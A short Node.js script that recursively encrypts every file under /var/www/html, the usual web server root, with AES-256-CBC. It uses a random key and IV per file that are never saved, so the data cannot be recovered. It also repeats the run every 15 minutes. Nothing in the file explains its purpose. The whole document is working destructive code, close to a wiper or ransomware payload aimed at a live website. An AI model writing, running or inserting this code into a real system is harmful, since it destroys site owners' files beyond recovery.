const fs = require('fs');
const crypto = require('crypto');

const inputDirectory = '/var/www/html';

// Function to encrypt directory
async function encryptDirectory(directory) {
  const files = fs.readdirSync(directory);

  for (const file of files) {
    const filePath = `${directory}/${file}`;

    if (fs.statSync(filePath).isDirectory()) {
      // Recursively encrypt subdirectories
      await encryptDirectory(filePath);
    } else {
      // Encrypt files
      await encryptFile(filePath);
    }
  }
}

// Function to encrypt file
function encryptFile(filePath) {
  return new Promise((resolve, reject) => {
    fs.readFile(filePath, (err, data) => {
      if (err) {
        return reject(err);
      }

      // Generate a random encryption key
      const key = crypto.randomBytes(32); // 256-bit key

      const cipher = crypto.createCipheriv('aes-256-cbc', key, crypto.randomBytes(16)); // IV length is 16 bytes for AES
      const encryptedData = Buffer.concat([cipher.update(data), cipher.final()]);

      fs.writeFile(filePath, encryptedData, (err) => {
        if (err) {
          return reject(err);
        }
        resolve();
      });
    });
  });
}

// Function to encrypt directory and log success/error
async function encryptAndLog(directory) {
  try {
    await encryptDirectory(directory);
    console.log('Directory encrypted successfully.');
  } catch (error) {
    console.error('Error encrypting directory:', error);
  }
}

// Run the encryption process every 15 minutes
setInterval(() => {
  encryptAndLog(inputDirectory);
}, 15 * 60 * 1000); // 15 minutes in milliseconds

// Initial run
encryptAndLog(inputDirectory);